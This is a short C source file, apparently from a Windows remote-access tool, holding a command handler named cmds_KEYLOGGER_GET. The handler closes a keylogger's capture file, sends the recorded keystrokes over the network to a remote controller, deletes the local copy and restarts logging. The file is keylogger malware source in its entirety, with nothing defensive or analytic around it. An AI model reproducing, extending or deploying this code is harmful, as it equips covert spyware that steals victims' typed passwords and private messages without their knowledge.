#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "net/file.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"
#include "keylogger/keylogger.h"

int cmds_KEYLOGGER_GET(void) //get and clear
{
	keylogger_IsBlocking = 1;
	KEYLOGGER_BLOCK_CPU_PROTECT();
	fclose(keylogger_F);

	int rv = net_File_Send(keylogger_FilePath);

	if(!rv)
	{
		return 0;
	}

	net_SetBuffer(NET_BUFFSIZE);

	if(remove(keylogger_FilePath) == -1)
	{
		keylogger_F = fopen(keylogger_FilePath, "a+");
		keylogger_IsBlocking = 0;

		return 1;
	}

	int i;
	
	for(i = 0; i != 10; i++)
	{
		if(keylogger_GetFile()) //find keyloger data by sigil or create a new one
		{
			break;
		}
	}

	if(!keylogger_F)
	{
		keylogger_F = fopen(keylogger_FilePath, "a+");
		keylogger_IsBlocking = 0;

		return 1;
	}

	keylogger_Setup();
	keylogger_IsBlocking = 0;

	return 1;
}